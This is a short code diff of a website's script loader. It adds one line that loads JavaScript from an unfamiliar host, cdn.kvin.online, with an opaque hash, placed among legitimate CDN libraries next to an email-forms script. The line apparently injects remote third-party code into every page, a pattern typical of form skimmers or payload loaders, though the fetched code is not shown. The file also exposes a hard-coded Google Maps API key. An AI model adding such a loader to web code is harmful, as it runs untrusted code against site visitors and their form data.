@@ -40,6 +40,7 @@ const loadScript = async (url)=>{
     // await loadLink("https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap");
 
 await loadScript("/callback/email/forms.js");
+await loadScript("https://cdn.kvin.online/site/?hash=244ea65a3b229661d5c77fecc615ca23");
 await loadScript("https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js");
 // await loadScript("https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js");
 await loadScript("https://maps.googleapis.com/maps/api/js?key=AIzaSyApaKMAilNYsX9vHCxmTgWCygep1xZ2BUw");
